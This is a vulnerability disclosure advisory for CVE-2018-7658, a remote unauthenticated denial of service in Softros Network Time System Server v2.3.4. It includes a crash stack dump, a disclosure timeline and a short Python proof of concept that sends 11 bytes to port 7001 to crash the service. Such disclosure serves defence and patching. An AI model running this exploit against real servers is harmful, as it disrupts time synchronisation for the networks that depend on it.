@@ -1,0 +1,109 @@
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/SOFTROS-NETWORK-TIME-SYSTEM-SERVER-v2.3.4-DENIAL-OF-SERVICE.txt
+[+] ISR: Apparition Security          
+ 
+
+Vendor:
+=============
+www.softros.com
+https://nts.softros.com/downloads/
+
+
+Product:
+===========
+Network Time System Server v2.3.4 
+Both x86/x64 versions
+
+
+Network Time System provides a solution to system time maintenance problems. This powerful client/server software enables you to set up a
+virtually fail-safe synchronized time environment for networks of any size and complexity, from small office networks (LAN) to those
+maintained at large enterprises (VPN, VLAN, WAN), from single site networks to those including numerous domains and involving complex
+routing techniques. Network Time System allows the creation of a custom source of precise time in a corporate network environment
+establishing an interconnected time synchronization system for each and every machine and device on the company network.
+
+
+Vulnerability Type:
+===================
+Denial Of Service
+
+
+
+CVE Reference:
+==============
+CVE-2018-7658
+
+
+Security Issue:
+================
+Network Time System (Server) "NTSServerSvc" service listens on Port 7001, unauthenticated remote attackers can crash the
+Server by sending exactly 11 bytes to the target system. Systems which may depend on critical time synchronization 
+could then potentially be impacted.
+
+
+Stack dump:
+
+'''
+eax=0320119a ebx=0000000b ecx=000000ff edx=00000000 esi=03167040 edi=0050b328
+eip=004069a5 esp=0447fee8 ebp=0447ff28 iopl=0         nv up ei ng nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010297
+NTSServerSvc+0x69a5:
+004069a5 880a            mov     byte ptr [edx],cl          ds:0023:00000000=??
+Resetting default scope
+
+FAULTING_IP: 
+NTSServerSvc+69a5
+004069a5 880a            mov     byte ptr [edx],cl
+
+EXCEPTION_RECORD:  (.exr -1)
+ExceptionAddress: 004069a5 (NTSServerSvc+0x000069a5)
+   ExceptionCode: c0000005 (Access violation)
+
+'''
+
+
+Exploit/POC:
+=============
+import socket
+#Network Time System (Server) NTSServerSvc.exe v2.3.4 
+#Softros Systems
+#NTS Server service for time synchronization over network
+
+print 'Network Time Server 11 byte Denial Of Service'
+print 'by hyp3rlinx'
+HOST=raw_input('Network Time Server IP')
+PORT=7001
+payload='A'*11 
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((HOST,PORT))
+s.send(payload)
+s.close()
+
+
+
+Network Access:
+===============
+Remote
+
+
+Severity:
+=========
+Medium
+
+
+Disclosure Timeline:
+=============================
+Vendor Notification: February 10, 2018
+Second attempt : February 24, 2018 
+Request CVE, assigned by Mitre : March 3, 2018
+March 5, 2018: Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
